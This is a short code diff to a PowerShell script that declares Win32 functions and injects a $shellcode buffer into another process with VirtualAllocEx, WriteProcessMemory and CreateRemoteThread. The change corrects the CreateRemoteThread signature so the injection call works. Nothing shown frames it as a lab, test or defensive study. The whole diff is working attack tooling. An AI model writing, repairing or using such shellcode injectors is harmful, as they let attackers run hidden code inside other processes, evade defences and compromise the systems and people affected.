@@ -26,7 +26,7 @@ public class Win32 {
     public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);
     
     [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags);
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
     
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool CloseHandle(IntPtr hObject);
@@ -49,7 +49,7 @@ $allocAddress = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $size, ($MEM_
 [Win32]::WriteProcessMemory($hProcess, $allocAddress, $shellcode, $size, [ref]$bytesWritten)
 
 # --- Create Remote Thread ---
-[Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $allocAddress, [IntPtr]::Zero, 0)
+[Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $allocAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero)
 
 # --- Clean Up ---
 [Win32]::CloseHandle($hProcess)
